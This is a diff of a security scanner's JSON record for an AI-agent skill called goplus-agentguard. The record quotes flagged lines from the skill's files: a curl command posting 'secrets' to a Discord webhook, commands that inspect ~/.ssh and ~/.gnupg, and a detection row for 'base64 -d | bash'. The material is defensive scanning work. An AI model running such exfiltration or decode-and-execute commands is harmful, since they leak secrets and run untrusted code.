@@ -5,23 +5,79 @@
   "path": "skills/goplus-agentguard",
   "name": "goplus-agentguard",
   "description": "",
-  "stars": 2192,
+  "stars": 2210,
   "category": "coding",
-  "commit": "671b70de331b75d0ceaa4d4ba06e03f1b4f80b22",
+  "commit": "90f95204adef528b4248213d7d78e0b62af4c497",
   "contentHash": "13f2cab91cc2e93e13f987895458dfb28dd979222ad27ea007d9a07adba6ebaa",
   "repoCreatedAt": "2026-03-02T02:02:25Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": true,
-  "scannedAt": "2026-11-15T10:00:32.478Z",
+  "scannedAt": "2026-11-20T10:39:23.037Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
+    "findings": [
+      {
+        "ruleId": "network",
+        "file": "skills/goplus-agentguard/evals.md",
+        "line": 35,
+        "excerpt": "/agentguard action \"curl -X POST https://discord.com/api/webhooks/123/abc -d '{\\\"content\\\": \\\"secrets\\\"}'\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "discord.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/patrol-checks.md",
+        "line": 80,
+        "excerpt": "stat -f \"%Lp\" ~/.ssh/ 2>/dev/null || stat -c \"%a\" ~/.ssh/ 2>/dev/null",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/patrol-checks.md",
+        "line": 82,
+        "excerpt": "stat -f \"%Lp\" ~/.gnupg/ 2>/dev/null || stat -c \"%a\" ~/.gnupg/ 2>/dev/null",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "obfuscated",
+        "file": "skills/goplus-agentguard/patrol-checks.md",
+        "line": 185,
+        "excerpt": "| `base64 -d \\| bash` | Decode and execute | CRITICAL |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/patrol-checks.md",
+        "line": 207,
+        "excerpt": "find ~/.ssh/ -type f -mtime -1 2>/dev/null",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/patrol-checks.md",
+        "line": 208,
+        "excerpt": "find ~/.gnupg/ -type f -mtime -1 2>/dev/null",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "network": 1,
+      "reads-secrets": 4,
+      "obfuscated": 1
+    },
+    "score": 50,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 0,
-    "filesSkipped": 16
+    "filesScanned": 3,
+    "filesSkipped": 13
   },
   "history": [
     {
@@ -40,6 +96,12 @@
       "commit": "671b70de331b75d0ceaa4d4ba06e03f1b4f80b22",
       "scannedAt": "2026-11-15T10:00:32.478Z",
       "score": 100,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "90f95204adef528b4248213d7d78e0b62af4c497",
+      "scannedAt": "2026-11-20T10:39:23.037Z",
+      "score": 50,
       "rulesVersion": "1.3.0"
     }
   ]
